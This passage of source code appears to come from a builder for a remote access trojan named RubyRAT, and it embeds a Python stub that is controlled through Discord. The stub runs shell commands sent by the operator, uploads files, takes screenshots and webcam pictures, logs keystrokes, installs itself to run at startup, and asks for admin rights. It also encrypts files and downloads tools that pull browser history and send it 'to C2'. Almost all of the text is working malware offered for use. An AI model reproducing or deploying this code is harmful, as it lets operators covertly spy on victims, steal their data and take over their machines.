the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n                batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n\r\n                # Remove the batch script and executable link\r\n                if os.path.exists(batch_script_path):\r\n                    os.remove(batch_script_path)\r\n                    print(f\"Batch script removed: {batch_script_path}\")\r\n                if os.path.exists(exe_link_path):\r\n                    os.remove(exe_link_path)\r\n                    print(f\"Executable link removed: {exe_link_path}\")\r\n\r\n                # Display a message indicating that persistence has been removed\r\n                await ctx.send(\"Bot persistence removed!\")\r\n                print(\"Bot persistence removed!\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while uninstalling: {e}\")\r\n            print(f\"An error occurred while uninstalling: {e}\")\r\n\r\n@bot.command()\r\nasync def elevate(ctx):\r\n    if is_admin():\r\n        return \"User has administrative privileges.\"\r\n    else:\r\n        return elevate_privileges()\r\n\r\n@bot.command()\r\nasync def cat(ctx, file_name):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            with open(file_name, 'r') as file:\r\n                file_content = file.read()\r\n                await ctx.send(f\"Content of '{file_name}':\\n```\\n{file_content}\\n```\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while reading the file: {e}\")\r\n\r\n@bot.command()\r\nasync def upload(ctx):\r\n    if ctx.channel == created_channel and ctx.message.attachments:\r\n        attachment = ctx.message.attachments[0]\r\n        await attachment.save(attachment.filename)\r\n        await ctx.send(f\"File '{attachment.filename}' uploaded successfully.\")\r\n\r\n\r\n\r\n\r\n# Function to generate a Fernet key from a password\r\ndef generate_key_from_password(password, salt=None):\r\n    if salt is None:\r\n        salt = os.urandom(16)\r\n    kdf = PBKDF2HMAC(\r\n        algorithm=hashes.SHA256(),\r\n        iterations=100000,  # You can adjust the number of iterations as needed\r\n        salt=salt,\r\n        length=32  # Length of the derived key\r\n    )\r\n    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))\r\n    return key, salt\r\n\r\n# Function to encrypt a file\r\ndef encrypt_file(input_file, password):\r\n    try:\r\n        key, salt = generate_key_from_password(password)\r\n        fernet = Fernet(key)\r\n        \r\n        with open(input_file, 'rb') as file:\r\n            file_data = file.read()\r\n        \r\n        encrypted_data = fernet.encrypt(file_data)\r\n        \r\n        # Use the same filename for the encrypted file\r\n        with open(input_file, 'wb') as encrypted_file:\r\n            encrypted_file.write(salt + encrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n# Function to decrypt a file\r\ndef decrypt_file(input_file, password):\r\n    try:\r\n        with open(input_file, 'rb') as encrypted_file:\r\n            salt = encrypted_file.read(16)  # Read the salt\r\n            encrypted_data = encrypted_file.read()\r\n        \r\n        key, _ = generate_key_from_password(password, salt)  # Reconstruct the key\r\n        \r\n        fernet = Fernet(key)\r\n        decrypted_data = fernet.decrypt(encrypted_data)\r\n        \r\n        # Use the same filename for the decrypted file\r\n        with open(input_file, 'wb') as decrypted_file:\r\n            decrypted_file.write(decrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n@bot.command()\r\nasync def encrypt(ctx, input_file, password):\r\n    encrypted_file_name = encrypt_file(input_file, password)\r\n    await ctx.send(f'File encrypted and saved as {encrypted_file_name}')\r\n    return encrypted_file_name\r\n\r\n@bot.command()\r\nasync def decrypt(ctx, input_file, password):\r\n    decrypted_file_name = decrypt_file(input_file, password)\r\n    if decrypted_file_name != \"Invalid token (key or password)\":\r\n        await ctx.send(f'File decrypted and saved as {decrypted_file_name}')\r\n    else:\r\n        await ctx.send(decrypted_file_name)\r\n\r\n\r\n\r\n\r\n\r\ndef has_persistence():\r\n    # Check if the bot has persistence using either the .py or .exe method\r\n    script_path = os.path.abspath(__file__)\r\n    startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n    batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n    exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n    \r\n    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')\r\n\r\ndef get_system_info():\r\n    try:\r\n        info = []\r\n        info.append(f\"System: {platform.system()}\")\r\n        info.append(f\"Node Name: {platform.node()}\")\r\n        info.append(f\"Release: {platform.release()}\")\r\n        info.append(f\"Version: {platform.version()}\")\r\n        info.append(f\"Machine: {platform.machine()}\")\r\n        info.append(f\"Processor: {platform.processor()}\")\r\n\r\n        # Memory information\r\n        memory = psutil.virtual_memory()\r\n        info.append(f\"Memory Total: {convert_bytes(memory.total)}\")\r\n        info.append(f\"Memory Available: {convert_bytes(memory.available)}\")\r\n        info.append(f\"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)\")\r\n\r\n        # Disk information\r\n        partitions = psutil.disk_partitions()\r\n        for partition in partitions:\r\n            partition_usage = psutil.disk_usage(partition.mountpoint)\r\n            info.append(f\"Disk {partition.device} ({partition.mountpoint}):\")\r\n            info.append(f\"  Total: {convert_bytes(partition_usage.total)}\")\r\n            info.append(f\"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)\")\r\n\r\n        # Additional system information\r\n        info.append(f\"Username: {os.getlogin()}\")\r\n        info.append(f\"Device Name: {platform.node()}\")\r\n        info.append(f\"IsAdmin: {is_admin()}\")\r\n        # Check if the bot has installed persistence (.py or .exe)\r\n        info.append(f\"Has Persistence: {has_persistence()}\")\r\n        private_ip = socket.gethostbyname(socket.gethostname())\r\n        info.append(f\"Private IP: {private_ip}\")\r\n\r\n        return '\\n'.join(info)\r\n    except Exception as e:\r\n        return f\"An error occurred while fetching system information: {e}\"\r\n\r\ndef convert_bytes(bytes_value):\r\n    # Convert bytes to human-readable format\r\n    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:\r\n        if bytes_value < 1024:\r\n            return f\"{bytes_value:.2f} {unit}\"\r\n        bytes_value /= 1024\r\n    return f\"{bytes_value:.2f} PB\"\r\n\r\ndef CallME(argument):\r\n    try:\r\n        result = subprocess.run(argument, shell=True, text=True, capture_output=True)\r\n        if result.returncode == 0:\r\n            return result.stdout\r\n        else:\r\n            return f\"Command exited with status code {result.returncode}.\\n{result.stderr}\"\r\n    except Exception as e:\r\n        return f\"An error occurred: {e}\"\r\n\r\nasync def DownloadFile(file_name, channel):\r\n    try:\r\n        with open(file_name, 'rb') as file:\r\n            file_content = file.read()\r\n            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))\r\n            await channel.send(f\"File '{file_name}' uploaded and available for download.\")\r\n    except Exception as e:\r\n        await channel.send(f\"An error occurred while uploading the file: {e}\")\r\n\r\n# check and ask for elevation\r\n# Function for trying to run the script elevated\r\ndef elevate_privileges():\r\n    try:\r\n        # Re-run the script with elevated privileges\r\n        ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)\r\n        return \"Success! You should recive a new connection with a Elevated Client.\"\r\n    except Exception as e:\r\n        return f\"Failed to elevate privileges: {e}\"\r\n        sys.exit(1)\r\n\r\n# Function for getting if user is elevated or not\r\ndef is_admin():\r\n    try:\r\n        # Check if the current process has administrative privileges\r\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0\r\n    except:\r\n        return False\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                    SETTINGS STARTS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\n# The part that runs on start, asking for elevation.\r\nif askForUACOnStart:\r\n    if is_admin():\r\n        print(\"User has administrative privileges.\")\r\n    else:\r\n        print(\"User does not have administrative privileges.\")\r\n        elevate_privileges()\r\nelse:\r\n    print(\"Does not try to ask for UAC on start\")\r\n\r\n# Try to install on start or not..\r\nif installOnStart:\r\n    print(\"Trying to install on start...\")\r\nelse:\r\n    print(\"Does not install on start!\")\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                     SETTINGS ENDS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\nbot.run('" + DBT + "')";
            }
            else if (selectedVersion == "1.7")
            {
                originalStub = "import os\r\nimport platform\r\nimport subprocess\r\nimport io\r\nimport socket\r\nimport sys\r\nimport shutil\r\nimport hashlib\r\nimport base64\r\nimport ctypes\r\nimport asyncio\r\nimport zipfile\r\nimport importlib\r\n\r\n# Check if running as executable\r\nrunning_as_executable = getattr(sys, 'frozen', False)\r\n\r\n\r\n# List of required modules and their corresponding import names\r\nrequired_modules = {\r\n    'psutil': 'psutil',\r\n    'discord': 'discord',\r\n    'pyautogui': 'pyautogui',\r\n    'pillow': 'PIL',\r\n    'opencv-python-headless': 'cv2',\r\n    'pynput': 'pynput',\r\n    'requests': 'requests',\r\n    'psutil': 'psutil',\r\n    'cryptography': 'cryptography',\r\n    'pygetwindow': 'pygetwindow',\r\n}\r\n\r\n# Additional required module\r\nmissing_modules = []\r\n\r\nfor module, import_name in required_modules.items():\r\n    try:\r\n        # Attempt to import the module\r\n        importlib.import_module(import_name)\r\n    except ImportError:\r\n        # Module is missing, add it to the missing_modules list\r\n        missing_modules.append(module)\r\n\r\n# Check and install required modules if needed\r\nif missing_modules:\r\n    missing_modules_str = \", \".join(missing_modules)\r\n    print(f\"Some required modules are missing: {missing_modules_str}\")\r\n    print(\"Installing missing modules...\")\r\n    try:\r\n        subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\"] + missing_modules_str.split(', '))\r\n        print(\"Modules installed successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while installing modules:\", e)\r\n        exit(1)\r\nelse:\r\n    print(\"All required modules are already installed.\")\r\n\r\n\r\nimport discord\r\nfrom discord.ext import commands\r\nimport requests\r\nimport pyautogui\r\nfrom cryptography.fernet import Fernet, InvalidToken\r\nfrom pynput import keyboard\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\nfrom PIL import Image\r\nimport cv2\r\nimport pygetwindow as gw\r\n\r\n\r\n\r\n# Settings for build\r\ninstallOnStart = " + cbCTS.Checked + "\r\naskForUACOnStart = " + cbSE.Checked + "\r\n\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\ncreated_channel = None  # To store the created channel object\r\n\r\nscript_path = os.path.abspath(__file__)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    print(f'Logged in as {bot.user.name}')\r\n\r\n    # Create encryption key\r\n    key = Fernet.generate_key()\r\n    global cipher_suite\r\n    cipher_suite = Fernet(key)\r\n\r\n\r\n    global created_channel  # Declare the global variable\r\n    system_username = os.getlogin()  # Get the system's username\r\n    guild = bot.guilds[0]  # Assuming the bot is in only one guild\r\n    category = discord.utils.get(guild.categories, name='RubyRAT')\r\n\r\n    if category is not None:\r\n        created_channel = await guild.create_text_channel(system_username, category=category)\r\n    else:\r\n        created_channel = await guild.create_text_channel(system_username)\r\n\r\n    # Get the public IP address using an external service\r\n    public_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']\r\n\r\n    # Send a message with the public IP address to the new channel\r\n    await created_channel.send(f\"Public IP Address of the client: **{public_ip}**. Client is **admin = {is_admin()}**. Also if you want to know more type **!help**\")\r\n\r\n@bot.command()\r\nasync def kill(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!kill':\r\n        await ctx.send(\"Disconnecting and removing chat channel...\")\r\n        if created_channel:\r\n            await created_channel.delete()\r\n        await bot.close()\r\n        os._exit(0)\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    if message.author == bot.user:\r\n        return\r\n\r\n    # Process !cmd messages\r\n    if message.channel == created_channel and message.content.startswith('!cmd'):\r\n        command_args = message.content.split(' ', 1)\r\n        if len(command_args) == 2:\r\n            output = CallME(command_args[1])\r\n            await message.channel.send(output)  # Send the output back to the chat\r\n\r\n    # Process !download messages\r\n    if message.channel == created_channel and message.content.startswith('!download'):\r\n        file_name = message.content.split(' ', 1)[1]\r\n        await DownloadFile(file_name, message.channel)\r\n\r\n    await bot.process_commands(message)\r\n\r\n\r\n# Customize the built-in help command\r\nbot.remove_command('help')  # Remove the default help command\r\n\r\n@bot.command(pass_context=True)\r\nasync def help(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!help':\r\n        help_message = (\r\n        \"**Available Commands:**\\n\"\r\n        \"`!cmd <command>` - Execute a shell command.\\n\"\r\n        \"`!download <filename>` - Download a file from the system.\\n\"\r\n        \"`!upload` - Upload a file to the bot.\\n\"\r\n        \"`!version` - Prints out current version.\\n\"\r\n        \"`!restart` - Will disconnect and then hopefully reconnect the bot.\\n\"\r\n        \"`!kill` - Disconnect the bot and remove the chat channel.\\n\"\r\n        \"`!screenshot` - Sends a frame of desktop from client to chat.\\n\"\r\n        \"`!webcam` - Takes a picture using clients webcam and sends it in chat.\\n\"\r\n        \"`!info` - Display some system information, such as GPU, CPU, RAM and more!.\\n\"\r\n        \"`!elevate` - Will try to elevate client from user to admin.\\n\"\r\n        \"`!install` - Try to get presisence on client system.\\n\"\r\n        \"`!uninstall` - Will remove presisence from client system.\\n\"\r\n        \"`!history` - Gather and download all web history from client.\\n\"\r\n        \"`!volume <volume_procent>` - Changes volume to the given procentage.\\n\"\r\n        \"`!dumplog` - Sends a file containing the keyloggers findings to C2.\\n\"\r\n        \"`!startlog` - Start the keylogging.\\n\"\r\n        \"`!stoplog` - Stop the keylogging.\\n\"\r\n        \"`!encrypt <filename> <password>` - Encrypt a file with a special password.\\n\"\r\n        \"`!decrypt <filename> <password>` - Decrypt a file with the special password.\\n\"\r\n        \"`!sendkey <Hello-World>` - Sends specified keys to client.\\n\"\r\n        \"`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\\n\"\r\n        )\r\n        await ctx.send(help_message)\r\n    \r\n\r\n@bot.command()\r\nasync def info(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!info':\r\n        system_info = get_system_info()\r\n        await ctx.send(f\"System Information:\\n```\\n{system_info}\\n```\")\r\n\r\n\r\n@bot.command()\r\nasync def screenshot(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!screenshot':\r\n        try:\r\n            # Capture the screenshot using pyautogui\r\n            screenshot = pyautogui.screenshot()\r\n\r\n            # Save the screenshot to a file\r\n            screenshot_path = 'screenshot.png'\r\n            screenshot.save(screenshot_path)\r\n\r\n            # Upload the screenshot to Discord\r\n            await ctx.send(file=discord.File(screenshot_path))\r\n            \r\n            # Remove the temporary file\r\n            os.remove(screenshot_path)\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def webcam(ctx):\r\n    global created_channel\r\n\r\n    if ctx.channel == created_channel and ctx.message.content == '!webcam':\r\n        try:\r\n            # Initialize the webcam capture\r\n            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam\r\n\r\n            if cap.isOpened():\r\n                # Capture a single frame from the webcam\r\n                ret, frame = cap.read()\r\n\r\n                if ret:\r\n                    # Save the captured image to a file\r\n                    image_path = 'webcam_image.png'\r\n                    cv2.imwrite(image_path, frame)\r\n\r\n                    # Upload the image to Discord\r\n                    await ctx.send(file=discord.File(image_path))\r\n\r\n                    # Remove the temporary image file\r\n                    os.remove(image_path)\r\n\r\n                else:\r\n                    await ctx.send(\"Failed to capture image from webcam.\")\r\n            else:\r\n                await ctx.send(\"Webcam not available.\")\r\n\r\n            # Release the webcam\r\n            cap.release()\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def version(ctx):\r\n    print(\"Version is d1.7\")\r\n    await ctx.send(\"Current version is 1.7\")\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                            TEST ZONE STARTS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\n@bot.command()\r\nasync def sendkey(ctx, Key):\r\n    if not Key:\r\n        await ctx.send(\"Please provide keys to be pressed (!SendKey <Hello-World>).\")\r\n        return\r\n    \r\n    await ctx.send(\"Creating .VBS script\")\r\n\r\n    # Filter Spaces (Change all \"-\" to \" \")\r\n    Key = Key.replace(\"-\", \" \")\r\n\r\n    # Create new .vbs script to send key\r\n    script_path = r'C:\\users\\public\\key.vbs'\r\n    with open(script_path, 'w') as f:\r\n        f.write('Set WshShell = WScript.CreateObject(\"WScript.Shell\")\\n')\r\n        f.write(f'WshShell.SendKeys \"{Key}\"\\n')\r\n\r\n    # Execute .vbs script\r\n    await ctx.send(\"Executing Script!\")\r\n    CallME(f'cscript \"{script_path}\"')\r\n\r\n    await ctx.send(\"Sent key: \" + Key)\r\n    \r\n# ---------------------------------------------------------------------------\r\n#\r\n#                              TEST ZONE ENDS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n# Create a variable to store the logged keys\r\nlogged_keys = []\r\n\r\n# Define a global variable for the listener and is_logging\r\nlistener = None\r\nis_logging = False\r\n\r\n# Define keys that should trigger a new line\r\nnew_line_keys = set([keyboard.Key.shift_r, keyboard.Key.backspace])\r\n\r\ndef on_key_press(key):\r\n    global is_logging\r\n    if is_logging:\r\n        try:\r\n            # Check if the key is a modifier key and skip logging if it is\r\n            if isinstance(key, keyboard.KeyCode):\r\n                logged_key = key.char\r\n            else:\r\n                logged_key = f\"[{str(key)}]\"\r\n\r\n            if key in new_line_keys:\r\n                logged_keys.append(\"\\n\")  # Start a new line\r\n            logged_keys.append(f\"Key: {logged_key} \")\r\n        except AttributeError:\r\n            if key == keyboard.Key.space:\r\n                logged_key = \" \"\r\n            else:\r\n                logged_key = f\"[{str(key)}]\"\r\n\r\n            if key in new_line_keys:\r\n                logged_keys.append(\"\\n\")  # Start a new line\r\n            logged_keys.append(f\"Key: {logged_key} \")\r\n\r\ndef start_logging():\r\n    global listener, is_logging\r\n    logged_keys.clear()  # Clear previously logged keys\r\n    listener = keyboard.Listener(on_press=on_key_press)\r\n    listener.start()\r\n    is_logging = True\r\n    print(\"Logging started...\")\r\n\r\ndef stop_logging():\r\n    global listener, is_logging\r\n    if listener:\r\n        listener.stop()\r\n        with open(\"keylog.txt\", \"w\") as logfile:\r\n            logfile.write(\" \".join(logged_keys))\r\n        is_logging = False\r\n        print(\"Logging stopped. Keys saved to 'keylog.txt'\")\r\n\r\n@bot.command()\r\nasync def startlog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global is_logging\r\n        if is_logging:\r\n            await ctx.send(\"Logging is already started. Use **!dumplog** to see logs.\")\r\n        else:\r\n            start_logging()\r\n            await ctx.send(\"Logging started. Use **!dumplog** to see logs.\")\r\n\r\n@bot.command()\r\nasync def stoplog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global is_logging\r\n        if is_logging:\r\n            stop_logging()\r\n            await ctx.send(\"Logging stopped. Use **!dumplog** to see logs.\")\r\n        else:\r\n            await ctx.send(\"Logging is already stopped. Use **!dumplog** to see logs.\")\r\n\r\n@bot.command()\r\nasync def dumplog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global logged_keys\r\n        if logged_keys:\r\n            # Save the logged keys to a text file\r\n            with open(\"keylog.txt\", \"w\") as logfile:\r\n                logfile.write(\"\".join(logged_keys))\r\n\r\n            # Send the log file as an attachment\r\n            await ctx.send(\"Here is the log:\", file=discord.File(\"keylog.txt\"))\r\n\r\n            # Delete the temporary log file\r\n            os.remove(\"keylog.txt\")\r\n        else:\r\n            await ctx.send(\"No keys have been logged yet.\")\r\n\r\n@bot.command()\r\nasync def restart(ctx):\r\n    await ctx.send(\"Restarting...\")\r\n\r\n    # Determine the script filename dynamically\r\n    script_filename = sys.argv[0]\r\n\r\n    # Build the command to run the script with arguments\r\n    script_command = [sys.executable, script_filename]\r\n\r\n    # Start a new process to run the script\r\n    subprocess.Popen(script_command)\r\n\r\n    # Delete channel\r\n    if created_channel:\r\n        await created_channel.delete()\r\n\r\n    # Exit the current script\r\n    sys.exit()\r\n\r\n\r\ndef installNirsoft(zip_file_url, exe_file_name):\r\n    # Destination path for the downloaded .zip file\r\n    zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n    # Directory where you want to extract the .exe file\r\n    extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n    \r\n    # Check if the .zip file already exists, and if not, download it\r\n    if not os.path.exists(zip_download_path):\r\n        try:\r\n            # Download the .zip file\r\n            response = requests.get(zip_file_url)\r\n            with open(zip_download_path, 'wb') as file:\r\n                file.write(response.content)\r\n            print(f\".zip File downloaded to {zip_download_path}\")\r\n        except Exception as e:\r\n            print(f\".zip File download failed: {str(e)}\")\r\n\r\n    # Extract the .exe file from the .zip archive\r\n    try:\r\n        with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n            # Check if the .exe file exists in the archive\r\n            if exe_file_name in zip_ref.namelist():\r\n                zip_ref.extract(exe_file_name, extraction_directory)\r\n                exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                print(f\".exe File extracted to {exe_path}\")\r\n            else:\r\n                print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n    except Exception as e:\r\n        print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\ndef program_isInstalled(full_path_to_exe):\r\n    return os.path.exists(full_path_to_exe)\r\n\r\n\r\n@bot.command()\r\nasync def history(ctx):\r\n    if ctx.channel == created_channel:\r\n        # URL of the .zip file to download\r\n        zip_file_url = \"https://www.nirsoft.net/utils/browsinghistoryview.zip\"\r\n\r\n        # Destination path for the downloaded .zip file\r\n        zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n        # Directory where you want to extract the .exe file\r\n        extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n\r\n        # Command to execute after extracting the .exe file\r\n        command_to_execute = r'BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml \"C:\\Users\\Public\\history.html\"'\r\n\r\n        # Check if the .zip file already exists, and if not, download it\r\n        if not os.path.exists(zip_download_path):\r\n            try:\r\n                # Download the .zip file\r\n                response = requests.get(zip_file_url)\r\n                with open(zip_download_path, 'wb') as file:\r\n                    file.write(response.content)\r\n                await ctx.send(f\".zip File downloaded to {zip_download_path}\")\r\n                print(f\".zip File downloaded to {zip_download_path}\")\r\n            except Exception as e:\r\n                await ctx.send(f\".zip File download failed: {str(e)}\")\r\n                print(f\".zip File download failed: {str(e)}\")\r\n\r\n        # Extract the .exe file from the .zip archive\r\n        try:\r\n            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n                # Specify the name of the .exe file you want to extract\r\n                exe_file_name = \"BrowsingHistoryView.exe\"\r\n\r\n                # Check if the .exe file exists in the archive\r\n                if exe_file_name in zip_ref.namelist():\r\n                    zip_ref.extract(exe_file_name, extraction_directory)\r\n                    exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                    await ctx.send(f\".exe File extracted to {exe_path}\")\r\n                    print(f\".exe File extracted to {exe_path}\")\r\n                else:\r\n                    await ctx.send(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n                    print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"Extraction of .exe file failed: {str(e)}\")\r\n            print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\n        # Execute the command using the extracted .exe file\r\n        try:\r\n            subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)\r\n            success_message = \"Command executed successfully.\"\r\n            print(success_message)\r\n            await ctx.send(success_message)\r\n\r\n            # Send file to C2\r\n            await ctx.send(\"Sent file to C2\", file=discord.File(extraction_directory + \"\\history.html\"))\r\n\r\n            # Delete the archive (.zip) and the extracted .exe file\r\n            os.remove(extraction_directory + \"\\\\history.html\")\r\n            os.remove(zip_download_path)\r\n            os.remove(exe_path)\r\n            print(f\".zip, .html and .exe files deleted.\")\r\n            await ctx.send(f\".zip, .html and .exe files deleted.\")\r\n        except Exception as e:\r\n            error_message = f\"Command execution failed: {str(e)}\"\r\n            print(error_message)\r\n            await ctx.send(\"Error: \" + error_message)\r\n\r\n@bot.command()\r\nasync def volume(ctx, volume_amount):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            if (program_isInstalled(\"C:\\\\users\\\\public\\\\nircmd.exe\")):\r\n                # Convert the volume_amount to an integer (0-100)\r\n                volume_amount = int(volume_amount)\r\n                if 0 <= volume_amount <= 100:\r\n                    # Calculate the volume level based on 1% being 655\r\n                    volume_level = volume_amount * 655\r\n                    # Execute the nircmd command to set the system volume\r\n                    subprocess.run([\"C:\\\\Github-Stuff\\\\nircmd\\\\nircmd.exe\", \"setsysvolume\", str(volume_level)])\r\n                    await ctx.send(f\"Volume changed to {volume_amount}%.\")\r\n                else:\r\n                    await ctx.send(\"Volume amount must be between 0 and 100.\")\r\n            else:\r\n                await ctx.send(\"NirCMD is not installed, installing it now!\")\r\n                print(\"NirCMD is not installed, installing it now!\")\r\n                installNirsoft(\"https://www.nirsoft.net/utils/nircmd.zip\", \"nircmd.exe\")\r\n                await ctx.send(\"Try running command again now...\")\r\n        except ValueError:\r\n            await ctx.send(\"Invalid volume amount. Please provide a number between 0 and 100.\")    \r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n\r\n@bot.command()\r\nasync def install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!install':\r\n        print(\"Received !install command\")\r\n        await ctx.send(\"Installing the bot on startup...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                        else:\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: {exe_link_path}\")\r\n\r\n                    await ctx.send(\"Bot installed on startup!\")\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    await ctx.send(f\"An error occurred while copying the script: {copy_error}\")\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            await ctx.send(f\"An error occurred while checking the operating system: {os_error}\")\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\n\r\n\r\n@bot.command()\r\nasync def uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!uninstall':\r\n        print(\"Received !uninstall command\")\r\n        await ctx.send(\"Uninstalling the bot...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n                batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n\r\n                # Remove the batch script and executable link\r\n                if os.path.exists(batch_script_path):\r\n                    os.remove(batch_script_path)\r\n                    print(f\"Batch script removed: {batch_script_path}\")\r\n                if os.path.exists(exe_link_path):\r\n                    os.remove(exe_link_path)\r\n                    print(f\"Executable link removed: {exe_link_path}\")\r\n\r\n                # Display a message indicating that persistence has been removed\r\n                await ctx.send(\"Bot persistence removed!\")\r\n                print(\"Bot persistence removed!\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while uninstalling: {e}\")\r\n            print(f\"An error occurred while uninstalling: {e}\")\r\n\r\n@bot.command()\r\nasync def elevate(ctx):\r\n    if ctx.channel == created_channel:\r\n        if is_admin():\r\n            return \"User has administrative privileges.\"\r\n        else:\r\n            return 